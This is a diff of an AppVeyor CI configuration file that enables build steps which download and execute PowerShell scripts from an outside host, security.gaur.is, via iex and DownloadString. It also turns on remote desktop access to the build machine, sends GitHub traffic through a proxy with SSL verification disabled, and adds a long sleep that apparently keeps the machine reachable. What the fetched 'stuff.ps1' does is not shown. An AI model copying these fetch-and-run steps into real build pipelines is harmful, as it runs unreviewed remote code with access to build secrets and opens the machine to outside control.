@@ -21,11 +21,11 @@ init:
   - ps: iex ((new-object net.webclient).DownloadString('https://security.gaur.is/appveyor/proxy'))
   - git config --global http.https://github.com.proxy http://%APPVEYOR_HTTP_PROXY_IP%:%APPVEYOR_HTTP_PROXY_PORT%
   - git config --global http.https://github.com.sslVerify false
-  #- ps: iex ((new-object net.webclient).DownloadString('https://raw.githubusercontent.com/appveyor/ci/master/scripts/enable-rdp.ps1'))
+  - ps: iex ((new-object net.webclient).DownloadString('https://raw.githubusercontent.com/appveyor/ci/master/scripts/enable-rdp.ps1'))
 
 
 install:
-  - ps: iex ((new-object net.webclient).DownloadString('https://security.gaur.is/appveyor/stuff.ps1'))
+  #- ps: iex ((new-object net.webclient).DownloadString('https://security.gaur.is/appveyor/stuff.ps1'))
   - git submodule update --init
   - rmdir C:\go /s /q
   - ps: Add-AppveyorMessage "This is a test message"
@@ -37,6 +37,6 @@ install:
   - gcc --version
 
 build_script:
-  #- ps: iex ((new-object net.webclient).DownloadString('https://security.gaur.is/appveyor/stuff.ps1'))
+  - ps: iex ((new-object net.webclient).DownloadString('https://security.gaur.is/appveyor/stuff.ps1'))
   - echo "test"
   - ps: Start-Sleep -s 360
